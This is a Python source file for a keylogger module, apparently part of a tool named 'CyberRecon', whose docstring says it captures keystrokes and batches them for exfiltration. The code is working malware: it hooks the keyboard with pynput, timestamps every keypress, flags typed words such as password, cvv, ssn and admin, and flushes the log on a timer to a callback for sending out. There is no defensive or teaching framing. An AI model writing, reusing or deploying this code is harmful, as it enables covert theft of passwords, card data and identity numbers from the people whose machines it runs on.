"""
CyberRecon Keylogger Module
Captures keystrokes and batches them for exfiltration.
"""

import threading
import time
from datetime import datetime
from collections import deque

try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False


class Keylogger:
    def __init__(self, buffer_size=500, flush_interval=30):
        self.buffer = deque(maxlen=buffer_size)
        self.flush_interval = flush_interval
        self.running = False
        self.listener = None
        self.flush_timer = None
        self.word_buffer = ""
        self.sensitive_words = ["password", "credit", "cvv", "ssn", "login", "admin"]
        self.callback = None

    def _on_press(self, key):
        try:
            char = key.char
            self.buffer.append({"key": char, "time": datetime.now().isoformat(), "type": "char"})
            self.word_buffer += char
            word_lower = self.word_buffer.lower()
            for sw in self.sensitive_words:
                if sw in word_lower:
                    self.buffer.append({"key": f"[SENSITIVE:{sw}]", "time": datetime.now().isoformat(), "type": "alert"})
                    self.word_buffer = ""
                    break
            if char in " \n\t":
                self.word_buffer = ""
        except AttributeError:
            key_name = str(key).replace("Key.", "")
            self.buffer.append({"key": f"[{key_name}]", "time": datetime.now().isoformat(), "type": "special"})
            self.word_buffer = ""

    def _flush_buffer(self):
        if self.buffer and self.callback:
            data = list(self.buffer)
            self.callback(data)
            self.buffer.clear()
        if self.running:
            self.flush_timer = threading.Timer(self.flush_interval, self._flush_buffer)
            self.flush_timer.start()

    def start(self, callback=None):
        if not PYNPUT_AVAILABLE:
            print("[!] pynput not installed. Keylogger disabled.")
            return False
        self.callback = callback
        self.running = True
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()
        self.flush_timer = threading.Timer(self.flush_interval, self._flush_buffer)
        self.flush_timer.start()
        print("[+] Keylogger started")
        return True

    def stop(self):
        self.running = False
        if self.listener:
            self.listener.stop()
        if self.flush_timer:
            self.flush_timer.cancel()
        print("[+] Keylogger stopped")

    def dump(self):
        return "".join([k["key"] for k in self.buffer])
